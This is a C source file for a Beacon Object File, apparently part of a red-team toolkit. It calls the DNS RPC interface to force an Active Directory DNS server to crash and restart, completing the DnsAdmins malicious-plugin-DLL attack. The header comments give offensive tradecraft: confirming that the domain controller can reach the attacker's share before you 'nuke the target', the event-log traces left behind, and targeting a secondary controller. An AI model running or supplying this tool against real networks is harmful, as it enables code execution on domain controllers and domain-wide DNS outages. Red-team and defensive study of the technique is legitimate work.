//
// dnsrpc_restart_server
//
// Used to force the ADIDNS server to restart itself via the RPC. This exit is not performed gracefully
// and the service control manager will automatically restart the server after two minutes by default. 
// Doing this multiple times in a row will continuously make the restarts take longer and may worsen the problem.
//
// Warning: If the DC for whatever reason can't touch the DLL payload you specified with `dnsrpc_set_pugin_dll` 
// it will refuse to start back up and you'll likely cripple the entire domain, consider testing if the DC can 
// connect back to your share using `dnsrpc_coerce_write`  before you accidentally nuke the target. 
//
// Operational security note: leaves various errors in the event log indicating that the dns.exe service crashed
// and may cause temporary DNS outage. Preferably you only perform this action on a secondary domain controller
// to avoid DNS issues.
//
// Requires access to an account that is a member of the DnsAdmins group
//
// Further reading:
//   https://www.semperis.com/blog/dnsadmins-revisited/
//   https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef
//


#include "dnsrpc.h"

#include "beacon.h"
#include "beacon_dev.h"
#include "beacon_rpc.h"
#include "beacon_rpc.c"

#include "dnsrpc_c.c"

#ifndef _DEBUG
DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT INT WINAPI USER32$wsprintfW(LPWSTR, LPCWSTR, ...);
DECLSPEC_IMPORT VOID NTAPI NTDLL$RtlZeroMemory(PVOID, SIZE_T);
#else
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#endif

void usage() {
    BeaconPrintf(CALLBACK_ERROR, 
        "Usage: dnsrpc_restart_server <server>\n"
        "Example: dnsrpc_restart_server DC01.research.labn"
    );
}

#ifdef _DEBUG
void wmain(int argc, wchar_t *argv[]) 
{
    if (argc < 2) {
        usage();
        return;
    }

    WCHAR* server = argv[1];

#else

void go(PCHAR args, int alen) 
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    WCHAR* server = (WCHAR*)BeaconDataExtract(&parser, NULL);
    if (server == NULL) {
        usage();
        return;
    }

#endif

    RPC_BINDING_HANDLE handle = dnsrpc_create_binding(server);
    if (!handle) {
        return;
    }
    DNSRPC_STATUS status = dnsrpc_restart_server(handle, server);
    if (!DNSRPC_OK(status)) {
        if (DNSRPC_THREW(status)) {
            dnsrpc_print_exception(status.exception);
        } else {
            dnsrpc_print_exception(status.rpc_status);
        }

        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "RPC call exited successfully, server should come back online in ~2 minutes.\n");

cleanup:
    if (handle != NULL) {
        RpcBindingFree(&handle);
    }

    return;
}

